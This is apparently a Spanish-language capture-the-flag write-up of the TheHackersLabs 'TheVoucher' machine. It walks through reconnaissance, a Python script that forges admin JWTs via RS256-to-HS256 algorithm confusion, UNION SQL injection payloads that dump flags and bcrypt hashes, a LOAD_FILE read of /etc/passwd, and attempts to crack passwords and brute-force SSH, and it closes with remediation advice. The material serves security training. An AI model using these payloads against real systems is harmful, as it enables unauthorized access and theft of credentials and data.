---
title: TheVoucher - Pentesting (TheHackersLabs)
permalink: /writeups/thevoucher/
excerpt: Writeup completo del proceso de pentesting sobre 192.168.143.133 (CyberShield Academy / TheHackersLabs - TheVoucher). Expandir los nodos del arbol para ver cada seccion.
date: 2026-09-01
categories:
- Máquinas
tags:
- thehackerslabs
- linux
- pentesting
- privesc
layout: writeup
techniques:
- thehackerslabs
- linux
- pentesting
- privesc
platform: TheHackersLabs
os: Linux
status: Completado
---

> **Plataforma:** TheHackersLabs

Writeup completo del proceso de pentesting sobre 192.168.143.133 (CyberShield Academy / TheHackersLabs - TheVoucher). Expandir los nodos del arbol para ver cada seccion.

## 1. Resumen Ejecutivo

RESUMEN EJECUTIVO
==================

Objetivo: 192.168.143.133 (mismo laboratorio autorizado que 192.168.143.131)
Hostname interno filtrado via SQLi: TheHackersLabs-TheVoucher
Fecha: Julio 2026

Servicios expuestos:
- 22/tcp  OpenSSH 9.6p1 (Ubuntu)
- 80/tcp  Apache 2.4.58 (pagina por defecto)
- 8080/tcp PHP built-in server (PHP 8.3.6) -- "CyberShield Academy"

Resultado alcanzado:
- Acceso ADMIN a la API mediante forja de JWT (confusion de algoritmo RS256->HS256)
- Inyeccion SQL (UNION-based) confirmada y explotada en /api/courses.php (parametro q)
- Volcado completo de la base de datos MariaDB "academy_ctf" (tablas: users, courses, flags)
- DOS BANDERAS extraidas de la tabla `flags`:
    PRELIM: c5c990058b42fd0b07c237a2a8035ac7
    FINAL:  8c694f3b9d100de3d2ee51b76db4f3cb

Resultado NO alcanzado (documentado honestamente):
- Acceso root a nivel de sistema operativo. El usuario de base de datos solo
  tiene privilegio USAGE (sin FILE/SUPER), por lo que la via clasica de
  RCE via MySQL UDF / INTO OUTFILE (que si funciono en el objetivo
  192.168.143.131) esta bloqueada aqui. El cracking offline de los hashes
  bcrypt de los usuarios admin/student no dio resultado en el tiempo
  disponible (bcrypt es deliberadamente lento: ~45-90 intentos/seg en la
  CPU disponible, 2 nucleos sin GPU -> recorrer rockyou.txt completo
  tomaria mas de 3 dias). La fuerza bruta directa por SSH se ve limitada
  por la proteccion MaxStartups del servidor.


## 2. Reconocimiento

RECONOCIMIENTO
==============

$ ping -c 2 192.168.143.133
64 bytes from 192.168.143.133: icmp_seq=1 ttl=64 (Linux)

$ nmap -sS -sV -sC -T4 -p- --min-rate=1000 192.168.143.133

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
         |_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    PHP cli server 5.5 or later (PHP 8.3.6)
         |_http-title: CyberShield Academy -- Advanced Cybersecurity Training
MAC Address: 00:0C:29:F9:BA:C0 (VMware)

El puerto 8080 (servidor de desarrollo integrado de PHP) aloja la
aplicacion objetivo real: "CyberShield Academy". El puerto 80 solo
muestra la pagina por defecto de Apache (sin contenido relevante).


## 3. Enumeracion Web (CyberShield Academy)

ENUMERACION WEB - CyberShield Academy (puerto 8080)
=====================================================

Paginas estaticas encontradas:
  /              -> Home
  /login.php     -> Formulario de login (POST via fetch a /api/auth.php)
  /courses.php   -> Buscador de cursos (placeholder: "try quotes, symbols, etc.")

Endpoints de API descubiertos (gobuster + pruebas manuales):
  POST /api/auth.php      -> Login, devuelve {"token": "..."} en JSON
  GET  /api/courses.php   -> Busqueda de cursos, requiere Authorization: Bearer <token>
  GET  /api/admin.php     -> 401 sin token; requiere rol admin
  GET  /api/profile.php   -> 401 sin token
  GET  /keys               -> "Access denied" (probablemente solo localhost)
  GET  /keys/public.pem    -> 200 OK, sirve una clave publica RSA

$ curl -s http://192.168.143.133:8080/keys/public.pem
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApDzyDfHCClQNka8/CF2q
Il0c0hvfIYS6eFHvMW8z+ERBfUls3UijaFWHYMUKPEuWQIeDbbact225OZNVt6gH
CyPP9DEmr0AEKTqd6vc0nAOFhRPim4wFe5Eedq5RVcqpRhd4uchEKGzYNa6XLm37
lX0GmWt2dpWx/wcrGiBqvpCieh89CTUvINVhFHhFnX44T/3atJkXaYQu330wYs8v
2ge/sEHI988fpGv74liVh7q/nhrOf8ZXFE3MOJNOp9sCtL4HFASAc/RXwuoErjW0
tcAiatPYlrWIFezMpFXEiTf5vXG9Zj0K7vFhJUN+QaxTrmH988LhRxsMUhzZZ/sb
nwIDAQAB
-----END PUBLIC KEY-----

Esta clave publica RSA (pensada para verificar tokens firmados con
alg=RS256) resulto ser la pieza clave para la siguiente vulnerabilidad.

Nota: se probo fuerza bruta de credenciales sobre /api/auth.php con
listas curadas + top rockyou; no se encontraron credenciales validas
por esa via -- el camino previsto era otro (JWT forgery + SQLi).


## 4. Vulnerabilidad: JWT Algorithm Confusion

VULNERABILIDAD 1: JWT Algorithm Confusion (RS256 -> HS256)
=============================================================

Descripcion:
El servidor valida tokens Bearer con un esquema JWT-like de 3 partes
(header.payload.signature, base64url). Se identifico que el endpoint
acepta el algoritmo HS256 (HMAC simetrico) ademas del RS256 (asimetrico
pensado para usar la clave publica solo para VERIFICAR, nunca como
secreto). Al enviar alg=HS256, el servidor firma/verifica usando la
MISMA clave que emplea para RS256 (la clave publica servida en
/keys/public.pem) como si fuera un secreto HMAC compartido. Como esa
clave es publica (la descargamos sin autenticacion), un atacante puede
forjar tokens arbitrarios firmados correctamente.

Enumeracion de errores devueltos por el validador (fuzzing progresivo):
  Bearer garbage123        -> {"error":"invalid_token","detail":"bad_token_parts"}
  Bearer aaaa.bbbb.cccc    -> {"error":"invalid_token","detail":"bad_json"}
  alg=none                 -> {"error":"invalid_token","detail":"unsupported_alg"}
  alg=None/NONE/nOnE       -> unsupported_alg (case-sensitive, no bypass)
  alg=HS256 (firma random) -> {"error":"invalid_token","detail":"bad_signature_hs"}
    -> confirma que SI se acepta HS256 y se valida la firma

Script de forja (Python):

import base64, json, hmac, hashlib, time

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

with open("public.pem", "rb") as f:
    key = f.read()          # bytes EXACTOS del archivo, incl. salto de linea final

now = int(time.time())
header  = {"alg": "HS256", "typ": "JWT"}
payload = {
    "sub": "admin",
    "email": "admin@cybershield.academy",
    "role": "admin",
    "iat": now,
    "exp": now + 3600,
}

h = b64url(json.dumps(header,  separators=(',',':')).encode())
p = b64url(json.dumps(payload, separators=(',',':')).encode())
signing_input = f"{h}.{p}".encode()

sig = hmac.new(key, signing_input, hashlib.sha256).digest()
token = f"{h}.{p}.{b64url(sig)}"
print(token)

Verificacion:
$ curl "http://192.168.143.133:8080/api/courses.php?q=test" \
    -H "Authorization: Bearer $TOKEN"
{"results":[{"id":2,"title":"Web App Pentesting", ...}],"sql_error":null}

-> 200 OK, acceso concedido como administrador SIN conocer ninguna
   contraseña real.

Detalle clave que hizo funcionar la firma: usar los BYTES EXACTOS del
archivo public.pem tal cual se descarga (incluyendo el salto de linea
final \n). Variantes con el contenido "stripped" (sin el \n final)
producian una firma distinta y el servidor la rechazaba
(bad_signature_hs), confirmando que compara byte a byte contra el
contenido crudo del archivo de clave.


## 5. Vulnerabilidad: SQL Injection UNION-based

VULNERABILIDAD 2: SQL Injection UNION-based en /api/courses.php
==================================================================

El parametro GET "q" de /api/courses.php se concatena sin sanitizar
en una consulta con LIKE, envuelta en comodines %...%. El propio
frontend (courses.php) invita a probar la inyeccion:
  placeholder="Search courses... (try quotes, symbols, etc.)"
y ademas maneja explicitamente un campo de respuesta "sql_error" que
se muestra al usuario -- diseño intencional para practicar SQLi
basada en errores/UNION.

Confirmacion del numero de columnas:
$ curl -G "http://192.168.143.133:8080/api/courses.php" \
    --data-urlencode "q=%' UNION SELECT 1,2,3-- -" \
    -H "Authorization: Bearer $TOKEN"
-> 3 columnas devueltas correctamente (id, title, description)

Enumeracion (todo via UNION SELECT, comentario -- - o #):

1) Version / usuario / base de datos actual:
   q=%' UNION SELECT 1,database(),version()-- -
   -> academy_ctf | 10.11.13-MariaDB-0ubuntu0.24.04.1

2) Listado de bases de datos:
   q=%' UNION SELECT 1,GROUP_CONCAT(schema_name SEPARATOR ', '),3
       FROM information_schema.schemata-- -
   -> information_schema, academy_ctf

3) Listado de tablas de la BD actual:
   q=%' UNION SELECT 1,GROUP_CONCAT(table_name SEPARATOR ', '),3
       FROM information_schema.tables WHERE table_schema=database()-- -
   -> flags, courses, users

4) Columnas de la tabla flags:
   q=%' UNION SELECT 1,GROUP_CONCAT(column_name SEPARATOR ', '),3
       FROM information_schema.columns
       WHERE table_schema=database() AND table_name='flags'-- -
   -> id, name, flag_value

5) EXTRACCION DE LAS BANDERAS:
   q=%' UNION SELECT id, name, flag_value FROM flags-- -
   -> {"id":1,"title":"PRELIM","description":"c5c990058b42fd0b07c237a2a8035ac7"}
      {"id":2,"title":"FINAL", "description":"8c694f3b9d100de3d2ee51b76db4f3cb"}

6) Columnas y volcado de la tabla users:
   columnas: id, email, password_hash, role, created_at
   q=%' UNION SELECT id, CONCAT(email,':',password_hash), role FROM users-- -
   -> admin@cybershield.academy:$2y$10$EC6q5rru/hD3yPn5nwVpUOLqqRWnRR0LbOXHQ7bT7.pnAW0AmSQ1e (admin)
      student@cybershield.academy:$2y$10$ddDtbqJ/PauZ3hhqnIH/zOr9j8TOHNUq1UB4tiuOxWGawlHjX135m (student)

7) Comprobacion de privilegios de BD (para evaluar RCE via UDF/OUTFILE):
   q=%' UNION SELECT 1,GROUP_CONCAT(privilege_type SEPARATOR ','),3
       FROM information_schema.user_privileges
       WHERE grantee LIKE CONCAT('%',SUBSTRING_INDEX(current_user(),'@',1),'%')-- -
   -> USAGE   (unico privilegio; SIN FILE, SIN SUPER)

   q=%' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
   -> NULL (confirma que LOAD_FILE esta bloqueado: sin privilegio FILE)

   Conclusion: a diferencia del objetivo 192.168.143.131 (donde la app
   se conectaba como root@% de MySQL con FILE+SUPER), aqui la cuenta de
   BD sigue el principio de menor privilegio. Esto IMPIDE escalar la
   SQLi a ejecucion de comandos del sistema operativo por esta via.

8) Hostname del servidor (filtrado via @@hostname):
   q=%' UNION SELECT 1,@@hostname,3-- -
   -> TheHackersLabs-TheVoucher


## 6. Banderas Encontradas

BANDERAS ENCONTRADAS
====================

Tabla `flags` (base de datos academy_ctf), extraida via SQLi UNION:

  +----+--------+----------------------------------+
  | id | name   | flag_value                        |
  +----+--------+----------------------------------+
  | 1  | PRELIM | c5c990058b42fd0b07c237a2a8035ac7  |
  | 2  | FINAL  | 8c694f3b9d100de3d2ee51b76db4f3cb  |
  +----+--------+----------------------------------+

Confirmacion adicional: el endpoint /api/admin.php, accedido con el
token JWT forjado (rol admin), devuelve directamente:
  {"flag": "c5c990058b42fd0b07c237a2a8035ac7"}
es decir, la bandera PRELIM tambien es recuperable simplemente
alcanzando la funcionalidad de administrador (sin necesidad de SQLi),
lo que confirma que el JWT forgery por si solo ya otorga acceso
administrativo valido en la aplicacion.


## 7. Intentos de Escalada a Root (sin exito)

INTENTOS DE ESCALADA A ROOT (documentados, sin exito en el tiempo disponible)
================================================================================

1) RCE via MySQL (UDF / INTO OUTFILE)
   Descartado: el usuario de BD solo tiene privilegio USAGE
   (secure_file_priv = NULL, sin FILE ni SUPER). No es posible escribir
   archivos en el sistema desde SQL en este objetivo.

2) Cracking offline de los hashes bcrypt (admin / student)
   Hashes:
     admin:   $2y$10$EC6q5rru/hD3yPn5nwVpUOLqqRWnRR0LbOXHQ7bT7.pnAW0AmSQ1e
     student: $2y$10$ddDtbqJ/PauZ3hhqnIH/zOr9j8TOHNUq1UB4tiuOxWGawlHjX135m

   Se probo:
     - Diccionario curado (temas: cybershield, voucher, TheHackersLabs,
       admin/student + variantes comunes) -> sin exito
     - hashcat -m 3200 (bcrypt) con rockyou top 300 / top 2000 /
       top 10000 -> sin exito
     - John the Ripper --format=bcrypt --wordlist=rockyou.txt -> en
       curso, 0 aciertos tras 27+ minutos

   Benchmark de rendimiento (CPU: AMD Ryzen 7 5700U, 2 nucleos, SIN GPU
   dedicada -- solo backend OpenCL PoCL/CPU):
     hashcat -m 3200 -b  -> 699 H/s (benchmark teorico)
     john --status        -> ~45 contraseñas/seg reales (89.92 c/s
                              combinado entre los 2 hashes con salts
                              distintos)

   A ese ritmo real, recorrer el diccionario rockyou.txt completo
   (14,344,385 lineas) tomaria aproximadamente:
     14,344,385 / 45 =~ 318,753 segundos =~ 88.5 horas =~ 3.7 dias

   Esto es intencional: bcrypt con factor de coste 10 esta diseñado
   especificamente para hacer inviable este tipo de ataque de fuerza
   bruta con hardware modesto. No se completo el cracking en el tiempo
   disponible de la sesion.

3) Fuerza bruta directa por SSH (puerto 22, OpenSSH 9.6p1)
   Usuarios probados: admin, student, voucher, hackerslabs, ctf,
   cybershield, thevoucher, root
   Contraseñas probadas: variantes tematicas + listas comunes cortas

   Resultado: el servidor SSH aplica una politica MaxStartups muy
   estricta. Rafagas de intentos (incluso con pausas de 0.7s entre
   cada uno) provocan el descarte silencioso de la mayoria de las
   conexiones ("Exceeded MaxStartups" / "Error reading SSH protocol
   banner"). Una conexion aislada (nmap -p22) siempre funciona
   correctamente, confirmando que NO es un baneo permanente sino una
   proteccion de concurrencia del propio sshd. Esto hace la fuerza
   bruta remota poco practica sin arriesgar bloqueos prolongados o
   generar ruido excesivo en un entorno con monitorizacion.

   No se identificaron credenciales SSH validas.

CONCLUSION SOBRE ROOT DEL SISTEMA OPERATIVO:
No se logro (ni se fabrico) una escalada a root de SO en este
objetivo dentro del tiempo disponible. El objetivo esta mejor
hardenizado que 192.168.143.131 en este aspecto especifico
(privilegios de BD minimos, bcrypt para contraseñas, SSH con
proteccion anti-fuerza-bruta). El compromiso alcanzado es COMPLETO a
nivel de aplicacion web (acceso admin total + exfiltracion de toda la
base de datos + ambas banderas), pero NO se extendio al sistema
operativo subyacente.


## 8. Conclusiones y Recomendaciones

CONCLUSIONES Y RECOMENDACIONES
================================

Cadena de ataque resumida:
  1. Descubrimiento de /keys/public.pem expuesto publicamente
  2. Forja de JWT admin explotando confusion de algoritmo RS256->HS256
     (firmar con HS256 usando la clave publica como secreto HMAC)
  3. Uso del token admin para alcanzar el endpoint /api/courses.php
  4. Explotacion de SQL Injection UNION-based en el parametro q
  5. Enumeracion de esquema (information_schema) y extraccion de las
     tablas flags y users completas

Hallazgos (ordenados por severidad):

[CRITICO] JWT Algorithm/Key Confusion (RS256 -> HS256)
  Causa raiz: el validador de tokens acepta multiples algoritmos y
  reutiliza el mismo material de clave (la clave publica RSA) tanto
  para RS256 como para HS256.
  Remediacion: fijar un unico algoritmo esperado por token/uso
  (nunca decidir el algoritmo a partir de un campo controlado por el
  cliente); si se requiere soporte multialgoritmo, usar claves
  completamente independientes por algoritmo y nunca derivar un
  secreto HMAC de una clave publica.

[CRITICO] SQL Injection (UNION-based) en /api/courses.php (parametro q)
  Causa raiz: concatenacion de entrada de usuario en una consulta SQL
  con LIKE sin sentencias preparadas.
  Remediacion: usar consultas parametrizadas (prepared statements /
  PDO bindParam) de forma universal; nunca exponer mensajes de error
  SQL crudos al cliente (el campo "sql_error" en la respuesta facilita
  enormemente la explotacion).

[INFORMATIVO / BUENA PRACTICA OBSERVADA] Privilegios de base de datos
  A diferencia de 192.168.143.131, la cuenta de BD de esta aplicacion
  sigue el principio de menor privilegio (solo USAGE, sin FILE/SUPER),
  lo que impidio escalar la SQLi a ejecucion de comandos del sistema
  operativo. Esto es exactamente la mitigacion recomendada y deberia
  aplicarse tambien en el otro objetivo.

[INFORMATIVO / BUENA PRACTICA OBSERVADA] Hashing de contraseñas
  Las contraseñas se almacenan con bcrypt (factor de coste 10), lo
  que hizo inviable el cracking offline con los recursos disponibles
  en el tiempo de la sesion.

[INFORMATIVO / BUENA PRACTICA OBSERVADA] Proteccion SSH
  La configuracion MaxStartups del servidor SSH limito efectivamente
  los intentos de fuerza bruta remota concurrente.

Recomendacion adicional:
  El archivo /keys/public.pem no deberia ser accesible publicamente
  sin necesidad; y el endpoint /keys deberia devolver un codigo de
  error HTTP apropiado (403) en lugar de 200 con cuerpo "Access
  denied", que revela la existencia del recurso a herramientas de
  enumeracion automatizada.
